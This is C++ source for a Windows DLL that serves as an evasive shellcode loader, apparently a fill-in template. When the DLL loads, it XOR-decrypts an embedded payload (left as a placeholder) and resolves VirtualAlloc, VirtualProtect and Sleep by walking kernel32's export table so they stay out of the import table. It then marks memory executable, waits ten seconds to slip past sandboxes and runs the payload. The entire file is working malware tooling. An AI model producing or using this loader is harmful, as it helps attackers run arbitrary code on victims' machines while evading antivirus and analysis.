#include "pch.h"
#include <Windows.h>

// Add your encrypted shellcode
unsigned char encryptedShellcode[] = { "Add your shellcode" };

// Decryption key (example, modify as necessary)
const BYTE decryptionKey = 0xAA; // Example key, customize as needed

// Function to decrypt the shellcode
void DecryptShellcode(unsigned char* shellcode, size_t length) {
    for (size_t i = 0; i < length; i++) {
        shellcode[i] ^= decryptionKey; // Simple XOR decryption
    }
}

// Custom function to resolve API by walking through kernel32.dll export table
FARPROC ResolveAPI(LPCSTR functionName) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return NULL;

    // Get the DOS and NT headers of kernel32.dll
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hKernel32 + pDosHeader->e_lfanew);

    // Get the export directory
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hKernel32 + exportDirRVA);

    // Get the addresses of functions and names
    DWORD* pFunctionNamesRVA = (DWORD*)((BYTE*)hKernel32 + pExportDir->AddressOfNames);
    DWORD* pFunctionsRVA = (DWORD*)((BYTE*)hKernel32 + pExportDir->AddressOfFunctions);
    WORD* pOrdinals = (WORD*)((BYTE*)hKernel32 + pExportDir->AddressOfNameOrdinals);

    // Iterate over all exported functions
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR pFunctionName = (LPCSTR)((BYTE*)hKernel32 + pFunctionNamesRVA[i]);
        if (strcmp(pFunctionName, functionName) == 0) {
            WORD ordinal = pOrdinals[i];
            DWORD functionRVA = pFunctionsRVA[ordinal];
            return (FARPROC)((BYTE*)hKernel32 + functionRVA);
        }
    }
    return NULL;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        // Resolve VirtualAlloc and VirtualProtect using custom resolver
        FARPROC pVirtualAlloc = ResolveAPI("VirtualAlloc");
        FARPROC pVirtualProtect = ResolveAPI("VirtualProtect");

        if (!pVirtualAlloc || !pVirtualProtect) {
            return FALSE; // If either API fails to resolve, abort
        }

        // Cast the resolved functions to the appropriate types
        LPVOID(WINAPI * MyVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))pVirtualAlloc;
        BOOL(WINAPI * MyVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))pVirtualProtect;

        // Decrypt the shellcode before execution
        size_t shellcodeSize = sizeof(encryptedShellcode);
        unsigned char* decryptedShellcode = new unsigned char[shellcodeSize];

        // Copy encrypted shellcode to decryptedShellcode
        memcpy(decryptedShellcode, encryptedShellcode, shellcodeSize);
        DecryptShellcode(decryptedShellcode, shellcodeSize);

        // Allocate memory for the shellcode using custom-resolved VirtualAlloc
        void* execMem = MyVirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (execMem) {
            // Copy decrypted shellcode to allocated memory
            memcpy(execMem, decryptedShellcode, shellcodeSize);

            // Change memory protection to execute using custom-resolved VirtualProtect
            DWORD oldProtect;
            if (MyVirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE, &oldProtect)) {
                // Cast the memory address to a function pointer and execute the shellcode
                VOID(WINAPI * MySleep)(DWORD) = (VOID(WINAPI*)(DWORD))ResolveAPI("Sleep");
                MySleep(10000); // Sleep for 10 seconds
                ((void(*)())execMem)();  // Execute the shellcode
            }

            // Optionally restore original protection
            MyVirtualProtect(execMem, shellcodeSize, oldProtect, &oldProtect);
        }

        // Cleanup
        delete[] decryptedShellcode;
    }
                           break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}